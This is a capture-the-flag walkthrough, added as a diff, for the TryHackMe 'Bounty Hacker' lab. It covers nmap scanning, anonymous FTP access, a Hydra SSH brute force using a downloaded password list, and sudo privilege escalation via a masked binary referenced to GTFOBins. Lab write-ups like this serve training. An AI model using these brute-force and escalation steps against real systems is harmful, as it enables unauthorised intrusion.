@@ -1,0 +1,230 @@
+Hello friends, welcome to my new walkthrough;
+Now we're going to try to hack into the Bounty Hacker machine. Good reading everyone.
+------------------------------------------------------------------------------------------------------------------------------------------------------
+fast nmap scan;
+nmap -Pn -n --top-ports 1000 -oN 1kscan -vv  {targetip}
+Nmap 7.92 scan initiated Sat Jan 15 10:21:19 2022 as: nmap -Pn -n --top-ports 1000 -oN 1kscan -vv targetip
+Nmap scan report for targetip
+Host is up, received user-set (0.10s latency).
+Scanned at 2022-01-15 10:21:19 EST for 14s
+Not shown: 967 filtered tcp ports (no-response)
+PORT      STATE  SERVICE         REASON
+20/tcp    closed ftp-data        reset ttl 63
+21/tcp    open   ftp             syn-ack ttl 63
+22/tcp    open   ssh             syn-ack ttl 63
+80/tcp    open   http            syn-ack ttl 63
+990/tcp   closed ftps            reset ttl 63
+40193/tcp closed unknown         reset ttl 63
+40911/tcp closed unknown         reset ttl 63
+41511/tcp closed unknown         reset ttl 63
+42510/tcp closed caerpc          reset ttl 63
+44176/tcp closed unknown         reset ttl 63
+44442/tcp closed coldfusion-auth reset ttl 63
+44443/tcp closed coldfusion-auth reset ttl 63
+44501/tcp closed unknown         reset ttl 63
+45100/tcp closed unknown         reset ttl 63
+48080/tcp closed unknown         reset ttl 63
+49152/tcp closed unknown         reset ttl 63
+49153/tcp closed unknown         reset ttl 63
+49154/tcp closed unknown         reset ttl 63
+49155/tcp closed unknown         reset ttl 63
+49156/tcp closed unknown         reset ttl 63
+49157/tcp closed unknown         reset ttl 63
+49158/tcp closed unknown         reset ttl 63
+49159/tcp closed unknown         reset ttl 63
+49160/tcp closed unknown         reset ttl 63
+49161/tcp closed unknown         reset ttl 63
+49163/tcp closed unknown         reset ttl 63
+49165/tcp closed unknown         reset ttl 63
+49167/tcp closed unknown         reset ttl 63
+49175/tcp closed unknown         reset ttl 63
+49176/tcp closed unknown         reset ttl 63
+49400/tcp closed compaqdiag      reset ttl 63
+49999/tcp closed unknown         reset ttl 63
+50000/tcp closed ibm-db2         reset ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+# Nmap done at Sat Jan 15 10:21:33 2022 -- 1 IP address (1 host up) scanned in 14.03 seconds
+
+and we found open ports. Let's see what's in the ports with the version scan. Let's see if anonymous login for FTP is on or off
+------------------------------------------------------------------------------------------------------------------------------------------------------
+nmap -sV -sC -p 21,22,80 {target ip} -vv -oN versionscan
+
+PORT   STATE SERVICE REASON         VERSION
+21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)****************************
+|_Can't get directory listing: TIMEOUT
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.8.255.134
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 4
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCgcwCtWTBLYfcPeyDkCNmq6mXb/qZExzWud7PuaWL38rUCUpDu6kvqKMLQRHX4H3vmnPE/YMkQIvmz4KUX4H/aXdw0sX5n9jrennTzkKb/zvqWNlT6zvJBWDDwjv5g9d34cMkE9fUlnn2gbczsmaK6Zo337F40ez1iwU0B39e5XOqhC37vJuqfej6c/C4o5FcYgRqktS/kdcbcm7FJ+fHH9xmUkiGIpvcJu+E4ZMtMQm4bFMTJ58bexLszN0rUn17d2K4+lHsITPVnIxdn9hSc3UomDrWWg+hWknWDcGpzXrQjCajO395PlZ0SBNDdN+B14E0m6lRY9GlyCD9hvwwB
+|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMCu8L8U5da2RnlmmnGLtYtOy0Km3tMKLqm4dDG+CraYh7kgzgSVNdAjCOSfh3lIq9zdwajW+1q9kbbICVb07ZQ=
+|   256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICqmJn+c7Fx6s0k8SCxAJAoJB7pS/RRtWjkaeDftreFw
+80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sat Jan 15 10:22:51 2022 -- 1 IP address (1 host up) scanned in 39.65 seconds
+------------------------------------------------------------------------------------------------------------------------------------------------------
+and there we go login for ftp
+# ftp {target ip}
+Connected to {arget ip}.
+220 (vsFTPd 3.0.3)
+Name (target ip:root): anonymous
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||43154|)
+150 Here comes the directory listing.
+-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
+-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
+226 Directory send OK.
+ftp> get locks.txt
+ftp> get task.txt
+ftp> bye
+
+own machine download it two files (locks.txt and task.txt)
+# cat locks.txt  
+rEddrAGON
+ReDdr4g0nSynd!cat3
+Dr@gOn$yn9icat3
+R3DDr46ONSYndIC@Te
+ReddRA60N
+R3dDrag0nSynd1c4te
+dRa6oN5YNDiCATE
+ReDDR4g0n5ynDIc4te
+R3Dr4gOn2044
+RedDr4gonSynd1cat3
+R3dDRaG0Nsynd1c@T3
+Synd1c4teDr@g0n
+reddRAg0N
+REddRaG0N5yNdIc47e
+Dra6oN$yndIC@t3
+4L1mi6H71StHeB357
+rEDdragOn$ynd1c473
+DrAgoN5ynD1cATE
+ReDdrag0n$ynd1cate
+Dr@gOn$yND1C4Te
+RedDr@gonSyn9ic47e
+REd$yNdIc47e
+dr@goN5YNd1c@73
+rEDdrAGOnSyNDiCat3
+r3ddr@g0N
+ReDSynd1ca7e
+
+# cat task.txt
+
+1.) Protect Vicious.
+2.) Plan for Red Eye pickup on the moon.
+
+***********-l*n***********
+
+important information found
+1. user
+2. possible password list
+
+Then, since we know that our ssh port is open and we have obtained the necessary information, let's brute force the ssh connection with the help of the hydra tool.
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+hydra -l l*n -P locks.txt ssh://targetip
+Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-15 10:31:21
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
+[DATA] attacking ssh://targetip:22/
+**************[22][ssh] host: targetip login: l*n   password: R*****************
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-01-15 10:31:27
+
+nice, brute force attack worked. Let's go ssh login
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+ssh lin@targetip
+---------
+The authenticity of host 'targetip (targetip)' can't be established.
+ED25519 key fingerprint is SHA256:Y140oz+ukdhfyG8/c5KvqKdvm+Kl+gLSvokSys7SgPU.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yesd
+Please type 'yes', 'no' or the fingerprint: yes
+Warning: Permanently added 'targetip' (ED25519) to the list of known hosts.
+lin@targeti's password: WRİTE THE FOUND PASSWORD
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)
+---------
+And yes, we logged into our machine, now let's type our commands after we log in.
+---------
+lin@bountyhacker:~/Desktop$ id
+uid=1001(lin) gid=1001(lin) groups=1001(lin)
+lin@bountyhacker:~/Desktop$ pwd
+/home/lin/Desktop
+lin@bountyhacker:~/Desktop$ uname -a
+Linux bountyhacker 4.15.0-101-generic #102~16.04.1-Ubuntu SMP Mon May 11 11:38:16 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+---------
+------------------------------------------------------------------------------------------------------------------------------------------------------
+Let's take a stroll for the first flag, user.txt
+---------
+lin@bountyhacker:~/Desktop$ ls -la
+total 12
+drwxr-xr-x  2 lin lin 4096 Jun  7  2020 .
+drwxr-xr-x 19 lin lin 4096 Jun  7  2020 ..
+-rw-rw-r--  1 lin lin   21 Jun  7  2020 user.txt
+lin@bountyhacker:~/Desktop$ cat user.txt
+THM{***********************}
+---------
+------------------------------------------------------------------------------------------------------------------------------------------------------
+Since we have already cracked the password of the lin user, when we enter the sudo -l command, we need to type the password easily when it asks for it.
+---------
+lin@bountyhacker:~/Desktop$ sudo -l
+[sudo] password for lin: 
+Sorry, try again.
+[sudo] password for lin: WE MUST WRİTE CORRECTLY
+Matching Defaults entries for lin on bountyhacker:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User lin may run the following commands on bountyhacker:
+    (root) /b*n/***
+
+https://gtfobins.github.io/
+------------------------------------------------------------------------------------------------------------------------------------------------------
+and we did it now we are root
+---------
+# cd root
+# ls -la
+total 40
+drwx------  5 root root 4096 Jun  7  2020 .
+drwxr-xr-x 24 root root 4096 Jun  6  2020 ..
+-rw-------  1 root root 2694 Jun  7  2020 .bash_history
+-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
+drwx------  2 root root 4096 Feb 26  2019 .cache
+drwxr-xr-x  2 root root 4096 Jun  7  2020 .nano
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root   19 Jun  7  2020 root.txt
+-rw-r--r--  1 root root   66 Jun  7  2020 .selected_editor
+drwx------  2 root root 4096 Jun  7  2020 .ssh
+# cat root.txt
+THM{******************}
+---------
+
+Thanks for reading Happy Hack days. See you next walkthrough...
